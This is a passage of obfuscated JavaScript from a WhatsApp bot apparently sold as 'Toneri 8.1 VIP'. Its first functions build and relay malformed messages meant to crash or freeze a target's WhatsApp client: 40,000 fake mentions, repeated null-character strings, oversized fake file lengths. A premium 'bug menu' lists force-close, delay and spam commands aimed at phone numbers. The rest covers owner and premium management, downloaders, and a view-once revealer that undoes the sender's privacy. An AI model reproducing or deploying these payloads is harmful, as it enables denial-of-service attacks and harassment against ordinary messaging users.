                      interactiveResponseMessage: {
                        body: {
                          text: "⛧Apollo Athencion⛧",
                          format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                          name: "review_and_pay",
                          paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"𝐆𝐨𝐝𝐬\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
                          version: 3
                        }
                      }
                    }
                  }
                },
                remoteJid: "status@broadcast"
              }
            }
          }
        }
      }, {});
      await _0x23b0c8.relayMessage(_0xb14937, _0x1987ca.message, {
        participant: {
          jid: _0xb14937
        },
        messageId: _0x1987ca.key.id
      });
    }
    async function _0x3f55be(_0x202043) {
      let _0x45f8da = true;
      let _0x4155fa = "5e03e0&mms3";
      let _0x4a961d = "10000000_2012297619515179_5714769099548640934_n.enc";
      let _0x25ed53 = "image/webp";
      if (11 > 9) {
        _0x45f8da = _0x45f8da ? false : true;
      }
      const _0x5662bd = {
        viewOnceMessage: {
          message: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/v/t62.43144-24/" + _0x4a961d + "?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=" + _0x4155fa + "=true",
              fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
              fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
              mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
              mimetype: _0x25ed53,
              directPath: "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
              fileLength: {
                low: Math.floor(Math.random() * 1000),
                high: 0,
                unsigned: true
              },
              mediaKeyTimestamp: {
                low: Math.floor(Math.random() * 1700000000),
                high: 0,
                unsigned: false
              },
              firstFrameLength: 19904,
              firstFrameSidecar: "KN4kQ5pyABRAgA==",
              isAnimated: true,
              contextInfo: {
                participant: _0x202043,
                mentionedJid: ["0@s.whatsapp.net", ...Array.from({
                  length: 40000
                }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
                groupMentions: [],
                entryPointConversionSource: "non_contact",
                entryPointConversionApp: "whatsapp",
                entryPointConversionDelaySeconds: 467593
              },
              stickerSentTs: {
                low: Math.floor(Math.random() * -20000000),
                high: 555,
                unsigned: _0x45f8da
              },
              isAvatar: _0x45f8da,
              isAiSticker: _0x45f8da,
              isLottie: _0x45f8da
            }
          }
        }
      };
      const _0x509ebc = {
        viewOnceMessage: {
          message: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/v/t62.43144-24/" + _0x4a961d + "?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=" + _0x4155fa + "=true",
              fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
              fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
              mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
              mimetype: _0x25ed53,
              directPath: "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
              fileLength: {
                low: Math.floor(Math.random() * 1000),
                high: 0,
                unsigned: true
              },
              mediaKeyTimestamp: {
                low: Math.floor(Math.random() * 1700000000),
                high: 0,
                unsigned: false
              },
              firstFrameLength: 19904,
              firstFrameSidecar: "KN4kQ5pyABRAgA==",
              isAnimated: true,
              contextInfo: {
                participant: _0x202043,
                mentionedJid: ["0@s.whatsapp.net", ...Array.from({
                  length: 40000
                }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
                groupMentions: [],
                entryPointConversionSource: "non_contact",
                entryPointConversionApp: "whatsapp",
                entryPointConversionDelaySeconds: 467593
              },
              stickerSentTs: {
                low: Math.floor(Math.random() * -20000000),
                high: 555,
                unsigned: _0x45f8da
              },
              isAvatar: _0x45f8da,
              isAiSticker: _0x45f8da,
              isLottie: _0x45f8da
            }
          }
        }
      };
      const _0x5978df = {
        buttonsResponseMessage: {
          selectedButtonId: "ោ៝".repeat(10000),
          selectedDisplayText: "⛧ RizxVelz - Official ⛧",
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
              length: 40000
            }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
            quotedMessage: {
              message: {
                text: "—!s` reyy",
                footer: "XxX",
                buttons: [{
                  buttonId: "🚀",
                  buttonText: {
                    displayText: "~𑇂𑆵𑆴𑆿".repeat(5000)
                  },
                  type: 1
                }],
                headerType: 1,
                viewOnce: false
              }
            }
          },
          type: 1
        }
      };
      const _0x3c5316 = generateWAMessageFromContent(_0x202043, _0x5662bd, {});
      const _0x3c26f9 = generateWAMessageFromContent(_0x202043, _0x509ebc, {});
      const _0x1e95b5 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
          xmessage: _0x5978df
        }
      }, {});
      for (const _0x5993e6 of [_0x3c5316, _0x3c26f9, _0x1e95b5]) {
        await tdx.relayMessage("status@broadcast", _0x5993e6.message, {
          messageId: _0x5993e6.key.id,
          statusJidList: [_0x202043],
          additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
              tag: "mentioned_users",
              attrs: {},
              content: [{
                tag: "to",
                attrs: {
                  jid: _0x202043
                },
                content: undefined
              }]
            }]
          }]
        });
      }
    }
    async function _0x285e2f(target) {
      const mentionedJid = ["696969696969@s.whatsapp.net", ...Array.from({
        length: 35000
      }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")];
      const msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: {
                text: ""
              },
              footer: {
                text: ""
              },
              carouselMessage: {
                cards: [{
                  header: {
                    title: "\0".repeat(9999),
                    imageMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                      mimetype: "image/jpeg",
                      fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                      fileLength: Math.floor(107363444981.76).toString(),
                      height: 1,
                      width: 1,
                      mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                      fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                      directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1749172037",
                      jpegThumbnail: null,
                      scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                      scanLengths: [8596, 155493]
                    },
                    hasMediaAttachment: true
                  },
                  body: {
                    text: "\0".repeat(9999)
                  },
                  footer: {
                    text: "\0".repeat(9999)
                  },
                  nativeFlowMessage: {
                    messageParamsJson: "\n".repeat(10000),
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        status: true,
                        criador: "PhynxAgency",
                        versao: "@latest",
                        atualizado: "2025-06-07",
                        suporte: "https://wa.me/status?video",
                        comandosDisponiveis: [command],
                        prefixo: prefix,
                        linguagem: "USA"
                      })
                    }]
                  }
                }]
              },
              contextInfo: {
                participant: target,
                stanzaId: "ABCDEF1234567890",
                mentionedJid: mentionedJid,
                quotedMessage: {
                  viewOnceMessage: {
                    message: {
                      interactiveResponseMessage: {
                        body: {
                          text: "Sent",
                          format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                          name: "call_permission_request",
                          paramsJson: JSON.stringify({
                            status: true
                          }),
                          version: 3
                        }
                      }
                    }
                  }
                },
                remoteJid: target
              }
            }
          }
        }
      }, {});
      await _0x23b0c8.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: target
              },
              content: undefined
            }]
          }]
        }]
      });
    }
    switch (_0x5cb20e) {
      case "start":
      case "help":
      case "menu":
        {
          let _0x155a00 = "( 👋🏻 ) - Hello, " + _0x349179 + "!\nI am an automated system (WhatsApp Bot) developed by 𝐒𝐚𝐧𝐝𝐲 𝐆𝐚𝐧𝐠𝐬𝐭𝐚👿 to assist you in various tasks directly through WhatsApp.\n\n*`𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐓𝐡𝐢𝐬 𝐆𝐚𝐧𝐠𝐬𝐭𝐚`*\n≧ Creator: 𝐒𝐚𝐧𝐝𝐲 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫\n≧ Script: 𝐓𝐨𝐧𝐞𝐫𝐢𝐆𝐚𝐧𝐠𝐬𝐭𝐚\n≧ VERSION: 𝟖.𝟏 𝐕𝐈𝐏\n⭔ Mode : " + (_0x23b0c8.public ? "𝐏𝐔𝐁𝐋𝐈𝐂" : "𝐏𝐑𝐈𝐕𝐀𝐓𝐄") + "\n⭔ Status : " + (_0x350a35 ? "𝐎𝐖𝐍𝐄𝐑" : _0x2dadea ? "𝐏𝐑𝐄𝐌𝐈𝐔𝐌" : "𝐍𝐎 𝐀𝐂𝐂𝐄𝐒𝐒") + "\n────────────────\n-# CMD\n ▢ .sticker\n ▢ .tourl\n ▢ .brat\n ▢ .qc\n ▢ .rvo\n ▢ .tiktok\n ▢ .ownermenu\n ▢ .tqto\n ▢ .xbug\n────────────────\n\n©𝐒𝐚𝐧𝐝𝐲𝐆𝐚𝐧𝐠𝐬𝐭𝐚👿\n ";
          const _0x2614e9 = [{
            buttonId: ".xbug",
            buttonText: {
              displayText: "𝐓𝐨𝐧𝐞𝐫𝐢 𝐗𝐛𝐮𝐠"
            }
          }, {
            buttonId: ".tqto",
            buttonText: {
              displayText: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 𝐁𝐫𝐨𝐭𝐡𝐞𝐫 "
            }
          }];
          const _0x2c8be5 = {
            image: {
              url: _0xf037c4
            },
            caption: _0x155a00,
            footer: "© 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 𝗦𝗮𝗻𝗱𝘆𝗚𝗮𝗻𝗴𝘀𝘁𝗮±",
            buttons: _0x2614e9,
            headerType: 6,
            contextInfo: {
              forwardingScore: 99999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363404564963436@newsletter",
                serverMessageId: null,
                newsletterName: "𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐕𝐈𝐏 "
              },
              mentionedJid: ["5521992999999@s.whatsapp.net"]
            },
            viewOnce: true
          };
          return _0x23b0c8.sendMessage(_0x3d7bad.chat, _0x2c8be5, {
            quoted: _0x52d80c
          });
        }
        break;
      case "thanksto":
      case "credit":
      case "tqto":
        {
          let _0x32c2ed = "( 👋🏻 ) - Hello, " + _0x349179 + "!\nI am an automated system (WhatsApp Bot) developed by 𝐒𝐚𝐧𝐝𝐲 𝐆𝐚𝐧𝐠𝐬𝐭𝐚👿 to assist you in various tasks directly through WhatsApp.\n\n*`𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐓𝐡𝐢𝐬 𝐆𝐚𝐧𝐠𝐬𝐭𝐚`*\n≧ Creator: 𝐒𝐚𝐧𝐝𝐲 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫\n≧ Script: 𝐓𝐨𝐧𝐞𝐫𝐢𝐆𝐚𝐧𝐠𝐬𝐭𝐚\n≧ VERSION: 𝟖.𝟏 𝐕𝐈𝐏\n⭔ Mode : " + (_0x23b0c8.public ? "𝐏𝐔𝐁𝐋𝐈𝐂" : "𝐏𝐑𝐈𝐕𝐀𝐓𝐄") + "\n⭔ Status : " + (_0x350a35 ? "𝐎𝐖𝐍𝐄𝐑" : _0x2dadea ? "𝐏𝐑𝐄𝐌𝐈𝐔𝐌" : "𝐍𝐎 𝐀𝐂𝐂𝐄𝐒𝐒") + "\n────────────────\n-# *THANKS TO*\n ▢ Sandy </ Developer />\n ▢ Reyy </ Coder />\n ▢ Satria </ Tangan kanan />\n ▢ Wizz </ Tangan Kanan />\n ▢ Drill </ Tangan Kanan />\n ▢ Ardi </ Tangan Kanan />\n ▢ Depayy </ My Friend />\n ▢ Rixz </ My Friend />\n ▢ Kayzen </ My Friend />\n ▢ Evil Cyt </ My Friend />\n ▢ Putra </ My Friend />\n ▢ Alpin </ My Friend />\n────────────────\n\n©𝐒𝐚𝐧𝐝𝐲𝐆𝐚𝐧𝐠𝐬𝐭𝐚👿\n";
          const _0x8bb33b = [{
            buttonId: ".menu",
            buttonText: {
              displayText: "𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮"
            }
          }, {
            buttonId: ".xbug",
            buttonText: {
              displayText: "𝐓𝐨𝐧𝐞𝐫𝐢 𝐗𝐛𝐮𝐠"
            }
          }];
          const _0x169477 = {
            image: {
              url: _0xf037c4
            },
            caption: _0x32c2ed,
            footer: "Whatsapp Bot By Sandy",
            buttons: _0x8bb33b,
            headerType: 6,
            contextInfo: {
              forwardingScore: 99999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363404564963436@newsletter",
                serverMessageId: null,
                newsletterName: "𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐕𝐈𝐏 "
              },
              mentionedJid: ["13135550002@s.whatsapp.net"]
            },
            viewOnce: true
          };
          return _0x23b0c8.sendMessage(_0x3d7bad.chat, _0x169477, {
            quoted: _0x52d80c
          });
        }
        break;
      case "menubug":
      case "xbug":
      case "bugmenu":
        {
          if (!_0x350a35 && !_0x2dadea) {
            return _0x3414f2(mess.premium);
          }
          let _0x2944a1 = "( 👋🏻 ) - Hello, " + _0x349179 + "!\nI am an automated system (WhatsApp Bot) developed by 𝐒𝐚𝐧𝐝𝐲 𝐆𝐚𝐧𝐠𝐬𝐭𝐚👿 to assist you in various tasks directly through WhatsApp.\n\n*`𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐓𝐡𝐢𝐬 𝐆𝐚𝐧𝐠𝐬𝐭𝐚`*\n≧ Creator: 𝐒𝐚𝐧𝐝𝐲 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫\n≧ Script: 𝐓𝐨𝐧𝐞𝐫𝐢𝐆𝐚𝐧𝐠𝐬𝐭𝐚\n≧ VERSION: 𝟖.𝟏 𝐕𝐈𝐏\n⭔ Mode : " + (_0x23b0c8.public ? "𝐏𝐔𝐁𝐋𝐈𝐂" : "𝐏𝐑𝐈𝐕𝐀𝐓𝐄") + "\n⭔ Status : " + (_0x350a35 ? "𝐎𝐖𝐍𝐄𝐑" : _0x2dadea ? "𝐏𝐑𝐄𝐌𝐈𝐔𝐌" : "𝐍𝐎 𝐀𝐂𝐂𝐄𝐒𝐒") + "\n────────────────\n-# *BUGS CMD*\n ▢ .toneri-forclose >Number<\n ▢ .toneri-invisdelay >Number<\n ▢ .toneri-delay >Number<\n ▢ .toneri-buldozer >Number<\n ▢ .toneri-forceinvis >Number<\n ▢ .toneri-group >Select Group<\n ▢ .toneri-spampair >Number<\n────────────────\n\n©𝐒𝐚𝐧𝐝𝐲𝐆𝐚𝐧𝐠𝐬𝐭𝐚👿\n";
          const _0x4ab5c7 = [{
            buttonId: ".menu",
            buttonText: {
              displayText: "𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮"
            }
          }, {
            buttonId: ".tqto",
            buttonText: {
              displayText: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 𝐁𝐫𝐨𝐭𝐡𝐞𝐫 "
            }
          }];
          const _0x3984dc = {
            image: {
              url: _0xf037c4
            },
            caption: _0x2944a1,
            footer: "Whatsapp Bot By Sandy",
            buttons: _0x4ab5c7,
            headerType: 6,
            contextInfo: {
              forwardingScore: 99999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363404564963436@newsletter",
                serverMessageId: null,
                newsletterName: "𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐕𝐈𝐏 "
              },
              mentionedJid: ["13135550002@s.whatsapp.net"]
            },
            viewOnce: true
          };
          return _0x23b0c8.sendMessage(_0x3d7bad.chat, _0x3984dc, {
            quoted: _0x52d80c
          });
        }
        break;
      case "ownermenu":
      case "menuowner":
      case "ifowner":
        {
          if (!_0x350a35) {
            return _0x3414f2(mess.premium);
          }
          let _0x16dda1 = "( 👋🏻 ) - Hello, " + _0x349179 + "!\nI am an automated system (WhatsApp Bot) developed by 𝐒𝐚𝐧𝐝𝐲 𝐆𝐚𝐧𝐠𝐬𝐭𝐚👿 to assist you in various tasks directly through WhatsApp.\n\n*`𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐓𝐡𝐢𝐬 𝐆𝐚𝐧𝐠𝐬𝐭𝐚`*\n≧ Creator: 𝐒𝐚𝐧𝐝𝐲 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫\n≧ Script: 𝐓𝐨𝐧𝐞𝐫𝐢𝐆𝐚𝐧𝐠𝐬𝐭𝐚\n≧ VERSION: 𝟖.𝟏 𝐕𝐈𝐏\n⭔ Mode : " + (_0x23b0c8.public ? "𝐏𝐔𝐁𝐋𝐈𝐂" : "𝐏𝐑𝐈𝐕𝐀𝐓𝐄") + "\n⭔ Status : " + (_0x350a35 ? "𝐎𝐖𝐍𝐄𝐑" : _0x2dadea ? "𝐏𝐑𝐄𝐌𝐈𝐔𝐌" : "𝐍𝐎 𝐀𝐂𝐂𝐄𝐒𝐒") + "\n────────────────\n-# 𝗢𝘄𝗻𝗲𝗿\n ▢ .addown\n ▢ .delown\n ▢ .addprem\n ▢ .delprem\n ▢ .public\n ▢ .self\n ▢ .<\n ▢ .>\n ▢ .$\n────────────────\n©𝐒𝐚𝐧𝐝𝐲𝐆𝐚𝐧𝐠𝐬𝐭𝐚👿\n";
          const _0x296971 = [{
            buttonId: ".menu",
            buttonText: {
              displayText: "𝐁𝐚𝐜𝐤 𝐓𝐨 𝐌𝐞𝐧𝐮"
            }
          }, {
            buttonId: ".tqto",
            buttonText: {
              displayText: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 𝐁𝐫𝐨𝐭𝐡𝐞𝐫 "
            }
          }, {
            buttonId: ".xbug",
            buttonText: {
              displayText: "𝐓𝐨𝐧𝐞𝐫𝐢 𝐗𝐛𝐮𝐠"
            }
          }];
          const _0x5078cc = {
            image: {
              url: _0xf037c4
            },
            caption: _0x16dda1,
            footer: "Whatsapp Bot By Sandy",
            buttons: _0x296971,
            headerType: 6,
            contextInfo: {
              forwardingScore: 99999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363404564963436@newsletter",
                serverMessageId: null,
                newsletterName: "𝐓𝐨𝐧𝐞𝐫𝐢 𝟖.𝟏 𝐕𝐈𝐏 "
              },
              mentionedJid: ["13135550002@s.whatsapp.net"]
            },
            viewOnce: true
          };
          return _0x23b0c8.sendMessage(_0x3d7bad.chat, _0x5078cc, {
            quoted: _0x52d80c
          });
        }
        break;
      case "addowner":
      case "addown":
        {
          if (!_0x350a35) {
            return _0x3414f2(mess.owner);
          }
          if (!_0x16fcad[0]) {
            return _0x1e1d9b("Usage: " + _0x5cb20e + " 62xxx");
          }
          let _0x2c3c3d = _0x2790a1.replace(/[^0-9]/g, "");
          let _0x23f621 = await _0x23b0c8.onWhatsApp(_0x2c3c3d + "@s.whatsapp.net");
          if (!_0x23f621.length) {
            return _0x1e1d9b("Invalid Number!");
          }
          _0x58cce0.push(_0x2c3c3d);
          _0x43d625.push(_0x2c3c3d);
          fs.writeFileSync("./system/owner.json", JSON.stringify(_0x58cce0));
          fs.writeFileSync("./system/premium.json", JSON.stringify(_0x43d625));
          _0x3414f2("Owner added successfully.");
        }
        break;
      case "delowner":
      case "delown":
        {
          if (!_0x350a35) {
            return _0x3414f2(mess.owner);
          }
          if (!_0x16fcad[0]) {
            return _0x1e1d9b("Usage: " + _0x5cb20e + " 62xxx");
          }
          let _0x558349 = _0x2790a1.replace(/[^0-9]/g, "");
          _0x58cce0.splice(_0x58cce0.indexOf(_0x558349), 1);
          _0x43d625.splice(_0x43d625.indexOf(_0x558349), 1);
          fs.writeFileSync("./system/owner.json", JSON.stringify(_0x58cce0));
          fs.writeFileSync("./system/premium.json", JSON.stringify(_0x43d625));
          _0x3414f2("Owner removed successfully.");
        }
        break;
      case "addpremium":
      case "addprem":
        {
          if (!_0x350a35) {
            return _0x3414f2("Owner only!");
          }
          if (!_0x16fcad[0]) {
            return _0x1e1d9b("Usage: " + (_0x7583df + _0x5cb20e) + " 62xxx");
          }
          let _0x1b3b64 = _0x2790a1.split("|")[0].replace(/[^0-9]/g, "");
          let _0x26e9ec = await _0x23b0c8.onWhatsApp(_0x1b3b64 + "@s.whatsapp.net");
          if (!_0x26e9ec.length) {
            return _0x1e1d9b("Invalid Number!");
          }
          _0x43d625.push(_0x1b3b64);
          fs.writeFileSync("./system/premium.json", JSON.stringify(_0x43d625));
          _0x3414f2("Success! User added to premium.");
        }
        break;
      case "delpremium":
      case "delprem":
        {
          if (!_0x350a35) {
            return _0x3414f2("Owner only!");
          }
          if (!_0x16fcad[0]) {
            return _0x1e1d9b("Usage: " + (_0x7583df + _0x5cb20e) + " 62xxx");
          }
          let _0x16f3b4 = _0x2790a1.split("|")[0].replace(/[^0-9]/g, "");
          let _0x8e77d8 = _0x43d625.indexOf(_0x16f3b4);
          if (_0x8e77d8 !== -1) {
            _0x43d625.splice(_0x8e77d8, 1);
            fs.writeFileSync("./system/premium.json", JSON.stringify(_0x43d625));
            _0x3414f2("Success! User removed from premium.");
          } else {
            _0x1e1d9b("User is not in the premium list.");
          }
        }
        break;
      case "public":
        {
          if (!_0x350a35) {
            return _0x3414f2(mess.owner);
          }
          _0x23b0c8.public = true;
          _0x1e1d9b("Bot set to public mode.");
        }
        break;
      case "private":
      case "self":
        {
          if (!_0x350a35) {
            return _0x3414f2(mess.owner);
          }
          _0x23b0c8.public = false;
          _0x1e1d9b("Bot set to private mode.");
        }
        break;
      case "brat":
        {
          if (!q) {
            return _0x1e1d9b("Send command with text. " + (_0x7583df + _0x5cb20e) + " Sandy");
          }
          const _0xd92835 = "https://brat.caliphdev.com/api/brat?text=" + q;
          await _0x679ae3(_0xd92835, _0x23b0c8, _0x3d7bad);
        }
        break;
      case "qc":
        {
          if (!q) {
            return _0x1e1d9b(_0x27a06f("teksnya"));
          }
          let _0x403c3e = {
            type: "quote",
            format: "png",
            backgroundColor: "#ffffff",
            width: 512,
            height: 768,
            scale: 2,
            messages: [{
              entities: [],
              avatar: true,
              from: {
                id: 1,
                name: "" + _0x4094f1,
                photo: {
                  url: await _0x23b0c8.profilePictureUrl(_0x3d7bad.sender, "image").catch(() => "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60")
                }
              },
              text: "" + q,
              replyMessage: {}
            }]
          };
          let _0x3c51a2 = await axios.post("https://bot.lyo.su/quote/generate", _0x403c3e, {
            headers: {
              "Content-Type": "application/json"
            }
          });
          let _0x535d4d = Buffer.from(_0x3c51a2.data.result.image, "base64");
          _0x23b0c8.sendImageAsSticker(_0x3d7bad.chat, _0x535d4d, _0x3d7bad, {
            packname: "" + global.packname,
            author: "" + global.author
          });
        }
        break;
      case "rvo":
      case "readvo":
      case "readviewonce":
      case "readviewoncemessage":
        {
          if (!_0x3d7bad.quoted) {
            return _0x1e1d9b("Reply to an image/video that you want to view");
          }
          if (_0x3d7bad.quoted.mtype !== "viewOnceMessageV2" && _0x3d7bad.quoted.mtype !== "viewOnceMessage") {
            return _0x1e1d9b("This is not a view-once message.");
          }
          let _0x498ffa = _0x3d7bad.quoted.message;
          let _0x22d066 = Object.keys(_0x498ffa)[0];
          if (!["imageMessage", "videoMessage"].includes(_0x22d066)) {
            return _0x1e1d9b("The quoted message is not an image or video.");
          }
          let _0x277f08 = await downloadContentFromMessage(_0x498ffa[_0x22d066], _0x22d066 === "imageMessage" ? "image" : "video");
          let _0x2c4317 = [];
          for await (const _0x3303df of _0x277f08) {
            _0x2c4317.push(_0x3303df);
          }
          let _0xc58329 = Buffer.concat(_0x2c4317);
          if (_0x22d066 === "videoMessage") {
            await _0x23b0c8.sendMessage(_0x3d7bad.chat, {
              video: _0xc58329,
              caption: _0x498ffa[_0x22d066].caption || ""
            });
          } else if (_0x22d066 === "imageMessage") {
            await _0x23b0c8.sendMessage(_0x3d7bad.chat, {
              image: _0xc58329,
              caption: _0x498ffa[_0x22d066].caption || ""
            });
          }
          await _0x23b0c8.sendMessage(_0x3d7bad.chat, {
            react: {
              text: "✅",
              key: _0x3d7bad.key
            }
          });
        }
        break;
      case "tt":
      case "tiktok":
        {
          if (!_0x2790a1) {
            return _0x1e1d9b(_0x27a06f("url"));
          }
          if (!_0x2790a1.startsWith("https://")) {
            return _0x1e1d9b(_0x27a06f("url"));
          }
          await _0x11e57d(q).then(async _0x5c13b3 => {
            await _0x23b0c8.sendMessage(_0x3d7bad.chat, {
              react: {
                text: "🕖",
                key: _0x3d7bad.key
              }
            });
            if (!_0x5c13b3.status) {
              return _0x1e1d9b("Error");
            }
            if (_0x5c13b3.durations == 0 && _0x5c13b3.duration == "0 Seconds") {
              let _0xfb2125 = new Array();
              let _0xe711a3 = 0;
              for (let _0xa76f77 of _0x5c13b3.data) {
                let _0x26bddd = await prepareWAMessageMedia({
                  image: {
                    url: "" + _0xa76f77.url
                  }
                }, {
                  upload: _0x23b0c8.waUploadToServer
                });
                await _0xfb2125.push({
                  header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: "Foto Slide Ke *" + (_0xe711a3 += 1) + "*",
                    hasMediaAttachment: true,
                    ..._0x26bddd
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Link Tautan Foto\",\"url\":\"" + _0xa76f77.url + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }]
                  })
                });
              }
              const _0x4ed2c6 = await generateWAMessageFromContent(_0x3d7bad.chat, {
                viewOnceMessageV2Extension: {
                  message: {
                    messageContextInfo: {
                      deviceListMetadata: {},
                      deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: "*Tiktok Downloader ✅*"
                      }),
                      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: _0xfb2125
                      })
                    })
                  }
                }
              }, {
                userJid: _0x3d7bad.sender,
                quoted: _0x3d7bad
              });
              await _0x23b0c8.relayMessage(_0x3d7bad.chat, _0x4ed2c6.message, {
                messageId: _0x4ed2c6.key.id
              });
            } else {
              let _0x3bf36c = await _0x5c13b3.data.find(_0x2e57b5 => _0x2e57b5.type == "nowatermark_hd" || _0x2e57b5.type == "nowatermark");
              await _0x23b0c8.sendMessage(_0x3d7bad.chat, {
                video: {
                  url: _0x3bf36c.url
                },
                mimetype: "video/mp4",
                caption: "*Tiktok Downloader ✅*"
              }, {
                quoted: _0x3d7bad
              });
            }
          }).catch(_0xc1093f => console.log(_0xc1093f));
          await _0x23b0c8.sendMessage(_0x3d7bad.chat, {
            react: {
              text: "",
              key: _0x3d7bad.key
            }
          });
        }
      case "restart":
        {
          if (!_0x350a35) {
            return _0x3414f2(mess.owner);
          }
          _0x1e1d9b("Restarting Bot.....");
          setTimeout(() => {
            process.send("reset");
          }, 3000);
        }
        break;
      case "tourl":
        {
          let _0x481270 = _0x3d7bad.quoted ? _0x3d7bad.quoted : _0x3d7bad;
